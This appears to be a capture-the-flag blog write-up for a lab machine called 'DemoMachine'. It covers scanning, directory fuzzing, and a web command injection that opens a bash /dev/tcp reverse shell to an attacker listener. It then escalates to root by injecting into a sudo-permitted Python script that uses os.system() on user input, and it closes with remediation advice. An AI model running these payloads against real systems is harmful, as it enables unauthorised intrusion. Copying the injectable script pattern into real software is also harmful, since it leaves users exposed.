---
layout: post
title: "HTB: DemoMachine"
date: 2026-01-06
difficulty: Easy
os: Linux
tags: [hackthebox, linux, web, privilege-escalation]
summary: "DemoMachine starts with a vulnerable web application that allows command execution as a low-privileged user. Careful local enumeration then reveals a misconfigured sudo rule, which provides a straightforward path to full root compromise."
thumbnail: /assets/images/demo-machine.png
read_time: 8
---

## Initial Scanning

I started with a full TCP scan to identify open ports on the target machine.

```bash
nmap -p- --min-rate 10000 10.10.11.69
```

The scan revealed several interesting ports:

```
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3306/tcp open  mysql
```

### Service Enumeration

Running a more detailed scan on the discovered ports:

```bash
nmap -p 22,80,3306 -sC -sV 10.10.11.69
```

Results showed:
- SSH running OpenSSH 8.2p1
- Apache 2.4.41 on port 80
- MySQL 5.7.33

## Web Enumeration

Visiting the web application at `http://10.10.11.69` revealed a simple login page.

![Web Application Login Page](/assets/images/demo-login.png)

### Directory Fuzzing

Using ffuf to discover hidden directories:

```bash
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://10.10.11.69/FUZZ
```

Found several interesting endpoints:
- `/admin` - Admin panel (403 Forbidden)
- `/backup` - Backup files directory
- `/api` - API endpoints

## Initial Access

### Command Injection Vulnerability

Testing the `/api/execute` endpoint revealed a command injection vulnerability:

```bash
curl -X POST http://10.10.11.69/api/execute -d "cmd=id"
```

Response:
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Getting a Reverse Shell

Setting up a listener:

```bash
nc -lvnp 4444
```

Executing the payload:

```bash
curl -X POST http://10.10.11.69/api/execute \
  -d "cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'"
```

Successfully obtained a shell as `www-data`!

## Privilege Escalation

### Local Enumeration

Checking sudo permissions:

```bash
sudo -l
```

Output revealed:
```
User www-data may run the following commands on demo:
    (root) NOPASSWD: /usr/bin/python3 /opt/scripts/backup.py
```

### Analyzing the Backup Script

Reading the backup script:

```python
#!/usr/bin/env python3
import os
import sys

# Vulnerable: Uses user input without sanitization
backup_path = sys.argv[1]
os.system(f"tar -czf /tmp/backup.tar.gz {backup_path}")
```

The script is vulnerable to command injection through `os.system()`.

### Exploitation

Creating the exploit:

```bash
sudo /usr/bin/python3 /opt/scripts/backup.py "/tmp; bash"
```

This spawned a root shell!

```bash
whoami
# root

cat /root/root.txt
# a1b2c3d4e5f6789...
```

## Flags

**User Flag:** `user_flag_here_1234567890abcdef`

**Root Flag:** `root_flag_here_0987654321fedcba`

## Key Takeaways

1. **Always enumerate thoroughly** - The command injection was found through systematic API testing
2. **Check sudo permissions** - `sudo -l` should be one of the first commands after gaining access
3. **Analyze scripts carefully** - Understanding how the backup script worked was key to exploitation
4. **Command injection in Python** - `os.system()` without input sanitization is dangerous

## Remediation

To fix these vulnerabilities:

1. **Input Validation**: Sanitize all user inputs before execution
2. **Use subprocess**: Replace `os.system()` with `subprocess.run()` with proper arguments
3. **Principle of Least Privilege**: Remove unnecessary sudo permissions
4. **WAF Implementation**: Deploy a Web Application Firewall to detect injection attempts

---

This was an excellent beginner-friendly machine that reinforced the importance of thorough enumeration and understanding common privilege escalation vectors.
